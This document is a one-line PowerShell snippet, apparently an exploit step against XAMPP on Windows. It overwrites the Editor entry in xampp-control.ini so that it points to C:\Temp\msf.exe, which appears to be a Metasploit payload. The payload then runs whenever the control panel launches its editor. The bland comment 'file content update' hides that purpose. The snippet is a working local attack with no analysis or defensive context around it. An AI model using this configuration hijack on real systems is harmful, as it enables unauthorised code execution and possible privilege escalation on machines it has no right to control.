```ps1
# file content update
(Get-Content C:\xampp\xampp-control.ini) -replace 'Editor=.*', 'Editor=C:\Temp\msf.exe' | Set-Content C:\xampp\xampp-control.ini
```
